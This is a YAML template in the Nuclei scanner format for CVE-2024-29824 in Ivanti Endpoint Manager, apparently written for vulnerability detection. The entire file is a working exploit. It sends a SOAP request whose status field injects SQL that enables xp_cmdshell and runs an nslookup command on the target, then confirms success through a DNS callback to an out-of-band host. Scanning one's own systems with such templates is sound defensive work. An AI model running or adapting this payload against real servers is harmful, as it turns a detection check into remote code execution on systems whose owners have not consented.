folder-6/poc-yaml-ivanti-epm-rce-cve-2024-29824.yaml

id: ivanti-epm-rce-cve-2024-29824
info:
  name: Ivanti EPM Remote Code Execution Vulnerability (CVE-2024-29824)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,dnslog,cve-2024-29824

variables:
  reverse: '{{interactsh-url}}'

http:
  - raw:
      - |
        POST /WSStatusEvents/EventHandler.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/soap+xml

        <?xml version="1.0" encoding="utf-8"?>
        <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
          <soap12:Body>
            <UpdateStatusEvents xmlns="http://tempuri.org/">
              <deviceID>string</deviceID>
              <actions>
                <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
                  <status>GoodApp=1|md5='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup {{reverse}}'--</status>
                </Action>
              </actions>
            </UpdateStatusEvents>
          </soap12:Body>
        </soap12:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "UpdateStatusEventsResponse"

      - type: word
        part: header
        words:
          - "application/soap+xml"

      - type: word
        part: interactsh_protocol
        words:
          - dns
